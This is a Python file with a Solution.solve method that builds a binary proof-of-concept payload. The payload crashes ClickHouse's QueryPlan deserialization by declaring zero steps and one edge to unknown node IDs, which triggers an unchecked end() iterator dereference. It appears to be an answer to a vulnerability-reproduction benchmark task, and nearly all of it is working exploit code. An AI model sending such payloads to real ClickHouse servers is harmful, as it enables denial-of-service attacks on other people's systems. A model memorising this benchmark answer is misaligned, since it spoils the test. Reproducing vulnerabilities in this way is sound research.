import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in ClickHouse QueryPlan deserialization.
        The vulnerability (ClickHouse PR #28766) occurs when parsing edges in a memory snapshot:
        the code looks up a node ID in `node_id_map` and dereferences the iterator without checking 
        if it equals `end()`.
        
        Format:
        - num_steps (VarUInt)
        - [steps...]
        - num_edges (VarUInt)
        - [edges...]:
          - from_node (String)
          - from_port (VarUInt)
          - to_node (String)
          - to_port (VarUInt)
        """
        
        def encode_varuint(n):
            res = bytearray()
            while n > 127:
                res.append((n & 0x7F) | 0x80)
                n >>= 7
            res.append(n)
            return bytes(res)

        def encode_string(s):
            b = s.encode('utf-8')
            return encode_varuint(len(b)) + b

        # Payload Construction:
        # 1. Define 0 steps (nodes). This leaves `node_id_map` empty.
        # 2. Define 1 edge.
        # 3. The edge refers to nodes "A" and "B".
        # 4. The parser attempts to look up "B" (or "A") in `node_id_map`.
        # 5. It returns `end()` (invalid iterator).
        # 6. The code dereferences `it->second`, leading to a crash (Stack Buffer Overflow/SEGV).
        
        payload = bytearray()
        payload += encode_varuint(0)     # num_steps = 0
        payload += encode_varuint(1)     # num_edges = 1
        
        # Edge definition
        payload += encode_string("A")    # from_node_id
        payload += encode_varuint(0)     # from_port_index
        payload += encode_string("B")    # to_node_id
        payload += encode_varuint(0)     # to_port_index
        
        return bytes(payload)
